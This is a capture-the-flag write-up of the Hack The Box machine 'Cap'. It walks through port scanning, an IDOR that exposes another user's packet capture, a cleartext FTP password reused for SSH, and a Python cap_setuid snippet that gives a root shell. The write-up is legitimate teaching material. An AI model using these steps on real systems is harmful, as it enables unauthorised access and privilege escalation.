---
title: "Cap"
difficulty: Easy
os: Linux
points: 20
rating: 4.6
date: 2021-06-05
avatar: assets/htb/cap.png
tags: [Clear Text Credentials, File System Configuration, Insecure Direct Object Reference (IDOR), Packet Capture Analysis, Password Reuse, SUID Exploitation, Python, Vulnerability Assessment]
htb_url: https://app.hackthebox.com/machines/Cap
---

<details>

<summary>About</summary>

### Machine Description

Cap is an easy Linux box that hosts an HTTP service offering admin features such as running network captures. Weak access controls expose an Insecure Direct Object Reference (IDOR), which lets us reach another user's capture. That capture holds credentials in plaintext, and reusing them gives us a foothold. From there, a Linux capability is abused to escalate to root.

### Area of Interest

Vulnerability Assessment | Common Security Controls | Security Operations | Log Analysis

### Vulnerabilities

Clear Text Credentials | File System Configuration | Insecure Direct Object Reference (IDOR)

### Security Tools

Nmap | LinPEAS | Wireshark

### Languages

Python

### Techniques

Packet Capture Analysis | Password Reuse | SUID Exploitation

</details>

## Summary

Cap is an easy Linux box running a Gunicorn-backed "Security Dashboard" web application that lets users run network captures. The application is vulnerable to an Insecure Direct Object Reference (IDOR) that lets me download another user's packet capture, which leaks the user `nathan`'s FTP password in cleartext. That password is reused for SSH, granting a foothold. Finally, the `cap_setuid` capability set on `/usr/bin/python3.8` is abused to escalate to root.

## Enumeration

Before getting started, I set up a working directory and add the target to my hosts file:

```bash
su
echo "<YOUR_IP> cap.htb" >> /etc/hosts

mkdir -p htb/cap.htb
cd htb/cap.htb
mkdir {nmap,content,exploits,scripts}
# At the end of the room
# To clean up the last line from the /etc/hosts file
sed -i '$ d' /etc/hosts
```

I like to kick off recon by pinging the target, which confirms connectivity and gives a hint about the OS.

```bash
ping -c 3 cap.htb
PING cap.htb (<YOUR_IP>) 56(84) bytes of data.
64 bytes from cap.htb (<YOUR_IP>): icmp_seq=6 ttl=63 time=77.8 ms
64 bytes from cap.htb (<YOUR_IP>): icmp_seq=9 ttl=63 time=80.1 ms
64 bytes from cap.htb (<YOUR_IP>): icmp_seq=11 ttl=63 time=51.5 ms
```

With these three ICMP packets we see a Time To Live (TTL) close to \~64. that points to a **\*nix** host, since Windows machines normally report a TTL around 128.

### Port scanning

Let's jump straight into an active port scan with nmap:

```bash
sudo nmap -p0- -sS -Pn -T4 -vvv cap.htb -oN nmap/tcp_port_scan
```

```bash
PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack ttl 63
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
```

<table><thead><tr><th width="154.99999999999997">command</th><th>result</th></tr></thead><tbody><tr><td>sT</td><td>TCP connect port scan (Default without root privilege)</td></tr><tr><td>sC</td><td>Run default scripts</td></tr><tr><td>sV</td><td>Enumerate versions</td></tr><tr><td>vvv</td><td>Verbosity</td></tr><tr><td>T4</td><td>Run a bit faster</td></tr><tr><td>oN</td><td>Output to file with nmap formatting</td></tr></tbody></table>

The machine exposes 3 open TCP ports: 21 (FTP), 22 (SSH) and 80 (HTTP). Next, we can enumerate the services running on those open ports:

```bash
sudo nmap -sV -sC -p 21,22,80 cap.htb -oN nmap/service_port_scan
```

```bash
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)
|   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)
|_  256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)
80/tcp open  http    gunicorn
|_http-server-header: gunicorn
|_http-title: Security Dashboard
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 404 NOT FOUND
|     Server: gunicorn
|     Date: Thu, 02 Jan 2025 11:42:26 GMT
|     Connection: close
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 232
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
|     <title>404 Not Found</title>
|     <h1>Not Found</h1>
|     <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Server: gunicorn
|     Date: Thu, 02 Jan 2025 11:42:21 GMT
|     Connection: close
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 19386
|     <!DOCTYPE html>
|     <html class="no-js" lang="en">
|     <head>
|     <meta charset="utf-8">
|     <meta http-equiv="x-ua-compatible" content="ie=edge">
|     <title>Security Dashboard</title>
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <link rel="shortcut icon" type="image/png" href="/static/images/icon/favicon.ico">
|     <link rel="stylesheet" href="/static/css/bootstrap.min.css">
|     <link rel="stylesheet" href="/static/css/font-awesome.min.css">
|     <link rel="stylesheet" href="/static/css/themify-icons.css">
|     <link rel="stylesheet" href="/static/css/metisMenu.css">
|     <link rel="stylesheet" href="/static/css/owl.carousel.min.css">
|     <link rel="stylesheet" href="/static/css/slicknav.min.css">
|     <!-- amchar
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     Server: gunicorn
|     Date: Thu, 02 Jan 2025 11:42:21 GMT
|     Connection: close
|     Content-Type: text/html; charset=utf-8
|     Allow: OPTIONS, GET, HEAD
|     Content-Length: 0
|   RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|     Connection: close
|     Content-Type: text/html
|     Content-Length: 196
|     <html>
|     <head>
|     <title>Bad Request</title>
|     </head>
|     <body>
|     <h1><p>Bad Request</p></h1>
|     Invalid HTTP Version &#x27;Invalid HTTP Version: &#x27;RTSP/1.0&#x27;&#x27;
|     </body>
|_    </html>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port80-TCP:V=7.94SVN%I=7%D=1/2%Time=67767B84%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,1FBC,"HTTP/1\.0\x20200\x20OK\r\nServer:\x20gunicorn\r\nDate:\x
SF:20Thu,\x2002\x20Jan\x202025\x2011:42:21\x20GMT\r\nConnection:\x20close\
SF:r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x201
SF:9386\r\n\r\n<!DOCTYPE\x20html>\n<html\x20class=\"no-js\"\x20lang=\"en\"
SF:>\n\n<head>\n\x20\x20\x20\x20<meta\x20charset=\"utf-8\">\n\x20\x20\x20\
SF:x20<meta\x20http-equiv=\"x-ua-compatible\"\x20content=\"ie=edge\">\n\x2
SF:0\x20\x20\x20<title>Security\x20Dashboard</title>\n\x20\x20\x20\x20<met
SF:a\x20name=\"viewport\"\x20content=\"width=device-width,\x20initial-scal
SF:e=1\">\n\x20\x20\x20\x20<link\x20rel=\"shortcut\x20icon\"\x20type=\"ima
SF:ge/png\"\x20href=\"/static/images/icon/favicon\.ico\">\n\x20\x20\x20\x2
SF:0<link\x20rel=\"stylesheet\"\x20href=\"/static/css/bootstrap\.min\.css\
SF:">\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20href=\"/static/css/f
SF:ont-awesome\.min\.css\">\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x
SF:20href=\"/static/css/themify-icons\.css\">\n\x20\x20\x20\x20<link\x20re
SF:l=\"stylesheet\"\x20href=\"/static/css/metisMenu\.css\">\n\x20\x20\x20\
SF:x20<link\x20rel=\"stylesheet\"\x20href=\"/static/css/owl\.carousel\.min
SF:\.css\">\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20href=\"/static
SF:/css/slicknav\.min\.css\">\n\x20\x20\x20\x20<!--\x20amchar")%r(HTTPOpti
SF:ons,B3,"HTTP/1\.0\x20200\x20OK\r\nServer:\x20gunicorn\r\nDate:\x20Thu,\
SF:x2002\x20Jan\x202025\x2011:42:21\x20GMT\r\nConnection:\x20close\r\nCont
SF:ent-Type:\x20text/html;\x20charset=utf-8\r\nAllow:\x20OPTIONS,\x20GET,\
SF:x20HEAD\r\nContent-Length:\x200\r\n\r\n")%r(RTSPRequest,121,"HTTP/1\.1\
SF:x20400\x20Bad\x20Request\r\nConnection:\x20close\r\nContent-Type:\x20te
SF:xt/html\r\nContent-Length:\x20196\r\n\r\n<html>\n\x20\x20<head>\n\x20\x
SF:20\x20\x20<title>Bad\x20Request</title>\n\x20\x20</head>\n\x20\x20<body
SF:>\n\x20\x20\x20\x20<h1><p>Bad\x20Request</p></h1>\n\x20\x20\x20\x20Inva
SF:lid\x20HTTP\x20Version\x20&#x27;Invalid\x20HTTP\x20Version:\x20&#x27;RT
SF:SP/1\.0&#x27;&#x27;\n\x20\x20</body>\n</html>\n")%r(FourOhFourRequest,1
SF:89,"HTTP/1\.0\x20404\x20NOT\x20FOUND\r\nServer:\x20gunicorn\r\nDate:\x2
SF:0Thu,\x2002\x20Jan\x202025\x2011:42:26\x20GMT\r\nConnection:\x20close\r
SF:\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x2023
SF:2\r\n\r\n<!DOCTYPE\x20HTML\x20PUBLIC\x20\"-//W3C//DTD\x20HTML\x203\.2\x
SF:20Final//EN\">\n<title>404\x20Not\x20Found</title>\n<h1>Not\x20Found</h
SF:1>\n<p>The\x20requested\x20URL\x20was\x20not\x20found\x20on\x20the\x20s
SF:erver\.\x20If\x20you\x20entered\x20the\x20URL\x20manually\x20please\x20
SF:check\x20your\x20spelling\x20and\x20try\x20again\.</p>\n");
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

Beyond the web server name 'Gunicorn', which the scan already revealed, whatweb doesn't tell us much more.

```bash
whatweb cap.htb
http://cap.htb [200 OK] Bootstrap, Country[RESERVED][ZZ], HTML5, HTTPServer[gunicorn], IP[<YOUR_IP>], JQuery[2.2.4], Modernizr[2.8.3.min], Script, Title[Security Dashboard], X-UA-Compatible[ie=edge]
```

### Web application discovery

To get a feel for the target's scope, let's open the web server in a browser. It's a dashboard showing security events, failed logins and similar data. Under 'Security Snapshot' there's a packet sniffer with a counter and the option to download the captured traffic.

The 'IP Config' section displays the attacker machine's network interface `<YOUR_IP>`, and the 'Network Status' page lists every active connection. The 'user tab' in the top-right corner is just a non-functional mockup, but we'll note the name 'Nathan'. it may come in handy for the SSH and FTP services.

Running a directory brute-force with GoBuster and reviewing the page source turns up nothing else of value.

```bash
gobuster dir -u http://cap.htb -w /usr/share/wordlists/dirb/common.txt
```

One detail does stand out: after running a "Security Snapshot", the browser is redirected to a path of the form `/data/[id]`, where `[id]` is the id number of the scan. This redirect is a useful clue about where to go next, so let's generate some traffic with ICMP requests and confirm it gets captured under that `/data/` path.

## Foothold

### IDOR on the capture endpoint

I first tried the ffuf tool with a wordlist of common usernames but got no results. The telling detail remained the URL pattern when a new capture is created, which follows the `/data/[id]` format, with the id increasing on every capture.

Playing with different parameter values, I found an Insecure Direct Object Reference (IDOR), a flaw that lets an attacker reach or alter objects by tampering with the identifiers a web page uses. This implies the server keeps the most recent scans, including packet captures made by users before us. Since I had landed on `/data/1`, browsing to `/data/0` indeed shows a packet capture containing several packets. So other users' scans are reachable.

### Extracting credentials from the PCAP

Now we can open the pcap file (named after the machine) — the one with sensitive data is the capture at ID `0` — and inspect its traffic in Wireshark, looking for FTP, HTTP or other sensitive data sent in cleartext.

Right away we spot a successful FTP login for the previously mentioned user 'Nathan', along with the password in cleartext. The sensitive data lives in the **FTP** application layer protocol; the full TCP Stream confirms the login. We now have the FTP credentials, and we'll also try them against the SSH service.

### Reusing the credentials

As anticipated, we can test the credentials on both the FTP and SSH services.

#### FTP/21

```bash
ftp nathan@cap.htb
```

#### SSH/22

The credentials are accepted by both services ;) so the password reuse also works over **SSH**, giving us an interactive foothold as `nathan`.

We already noticed interesting files while enumerating, so let's go ahead and read the user flag in Nathan's home directory:

```bash
cat user.txt
f17c************************c401
```

## Privilege Escalation

Running `sudo -l` shows no commands that Nathan is allowed to run with sudo privileges. Before reaching for automated tools like LinPEAS, I want to run a few quick checks:

```bash
crontab -l
cat /proc/version
getcap -r /2>/dev/null
```

After looking at cronjobs, the kernel version and [capabilities](https://man7.org/linux/man-pages/man7/capabilities.7.html), only the Linux capabilities give us something interesting, so we'll follow that lead!&#x20;

Reading the first line of the output: `/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip`, we notice '[cap\_setuid](https://man7.org/linux/man-pages/man2/setuid.2.html)', meaning the Python interpreter at `/usr/bin/python3.8` can raise its privileges.&#x20;

The plan is to set our setuid to 0 (the root user). We can change it right on the victim machine and run OS commands through the `/usr/bin/python3.8` interpreter:

```python
import os
os.setuid(0)
os.system("/bin/bash")
```

With the uid set to 0 we now have root access! To finish, we head into the root folder and grab the root flag:

```bash
cat /root/root.txt
751f************************f9b7
```

---
